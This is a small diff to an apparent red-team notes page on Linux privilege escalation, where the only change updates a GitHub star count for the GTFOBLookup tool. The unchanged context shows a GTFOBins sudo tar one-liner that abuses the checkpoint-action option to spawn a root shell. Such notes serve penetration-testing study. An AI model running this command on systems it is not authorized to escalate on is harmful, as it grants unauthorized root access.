@@ -22,7 +22,7 @@ You can only run `tar` using `sudo`. Run the command below from [GTFOBins](https
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) <small>(0.2k ⭐)</small> for offline browsing.
+➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) <small>(0.3k ⭐)</small> for offline browsing.
 
 ➡️ You may need/want to create a [root bash](/cybersecurity/red-team/s4.privesc/linux/utils/rootbash.md).
 </div></div>
